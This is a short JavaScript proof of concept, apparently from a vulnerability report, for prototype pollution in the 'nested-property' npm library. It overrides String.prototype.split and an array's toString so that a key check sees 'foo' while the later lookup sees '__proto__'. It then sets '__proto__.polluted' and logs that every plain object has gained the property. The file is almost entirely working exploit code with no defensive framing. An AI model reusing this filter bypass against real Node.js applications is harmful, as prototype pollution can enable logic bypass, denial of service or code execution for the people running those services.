var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const nestedProperty = require('nested-property');
const object1 = {};
console.log({}.polluted);
nestedProperty.set(object1, '__proto__.polluted', 'yes');
console.log({}.polluted);